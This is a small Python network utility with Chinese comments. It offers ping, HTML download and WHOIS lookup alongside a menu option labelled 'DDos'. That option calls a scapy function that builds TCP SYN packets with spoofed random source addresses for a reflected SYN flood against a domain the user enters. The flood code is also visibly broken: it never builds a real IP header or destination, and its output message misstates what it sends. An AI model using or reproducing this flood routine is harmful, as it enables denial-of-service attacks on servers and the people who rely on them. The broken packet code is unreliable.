#更新时间：
#版本：0.1.1 Alpha version
#作者：fish
#名称：Internet Query

import time,random
import os,sys
from ping3 import ping   #ping模块
import requests          #get,post模块
import whois             #whois模块
from scapy.all import *  #网络模块
from scapy.layers.inet import TCP

#变量定义

version = "0.1.1 Alpha version"

#其他函数定义

def generate_random_ipv4():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def ping_ip(ip):
    response_time = ping(ip)
    return response_time

def download_html(url):
    response = requests.get(url)
    default_filename = "Internet_Query_" + time.strftime('%Y%m%d%H%M%S', time.localtime()) + ".html"
    save_path = os.path.join("./download", default_filename) # "." 代表当前脚本所在文件夹
    directory = os.path.dirname(save_path)
    if directory and not os.path.exists(directory):
        os.makedirs(directory) #
    with open(save_path, 'wb') as f:
        f.write(response.content)
    print(f"文件已保存为: {save_path}")

def get_whois_info(domain):
    try:
        w = whois.whois(domain)
        # 打印原始信息
        # print(w)
        print(f"域名: {w.domain_name}")
        print(f"注册商: {w.registrar}")
        print(f"创建时间: {w.creation_date}")
        print(f"过期时间: {w.expiration_date}")
        print(f"更新时间: {w.updated_date}")
        print(f"名称服务器: {w.name_servers}")
    except Exception as e:
        print(f"查询出错: {e}")

def syn_flood_reflection(target_ip, reflector_ip, target_port=80, packet_count=1):
    print("start ddos.")
    for abcdefg in range(packet_count+4):
        print("frequency ",abcdefg)
        # 1. 伪造源IP
        ip = generate_random_ipv4()
        #随机化源端口
        random_sport = random.randint(1024, 65535)
        # 3. 构造 TCP SYN 包 (握手第一步)
        # flags="S" 代表 SYN 标志位
        tcp = TCP(sport=random_sport, dport=target_port, flags="S", seq=random.randint(1000, 9000))
        # 4. 发送包
        # 这里的逻辑是：攻击者 -> (伪造受害者IP) -> 第三方服务器
        # 第三方服务器会向受害者回复 SYN-ACK
        send(ip / tcp, verbose=False)
        print(f"Sent SYN packet to {reflector_ip} spoofing source as {target_ip}")

#主函数定义

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("Internet Query "+version)
    print("--------Function--------\n1.ping\n2.get html\n3.how is\n4.DDos\n5.other\n6.exit\n------------------------")
    main_input_botton = int(input("input your choice "))
    #print(main_input_botton)
    if main_input_botton == 1:   #ping
        #print("start ping")
        ping_ip_114514 = input("Enter your want to ping's ip or Domain name ")
        print("We are performing an operation, please do not close this program.")
        ping_result = ping_ip(ping_ip_114514)
        if ping_result is not None:
            print(f" {ping_ip_114514} delay: {ping_result:.3f} s ({ping_result*1000:.0f} ms)")
        else:
            print(f" {ping_ip_114514} request timed out or unable to access")
    elif main_input_botton == 2:     #get html
        #print("get html")
        get_html_url = input("Enter your want to get's url ")
        download_html(get_html_url)
    elif main_input_botton == 3:
        #print("who is")
        whois_TLD = input("Enter the top-level domain you want to get WHOIS information for ")
        get_whois_info(whois_TLD)
    elif main_input_botton == 4:
        #print("DDos")
        ddos_frequency = 0
        ddos_frequency = int(input("Please input your wan't to ddos's frequency "))
        ddos_Domain_Name = "192.168.1.1"
        ddos_Domain_Name = input("input your wan't to ddos's domain name ")
        syn_flood_reflection(target_ip=generate_random_ipv4(),reflector_ip=ddos_Domain_Name,packet_count=ddos_frequency)
    elif main_input_botton == 5:
        #print("other")
        os.system('cls' if os.name == 'nt' else 'clear')
        other_input_botton = 0
        other_input_botton = int(input("--------other--------\n1.ipv4"))
    else:
        os.system('cls' if os.name == 'nt' else 'clear')
        sys.exit(0)

#主程序start
if __name__ == "__main__":
    main()
    print("close!")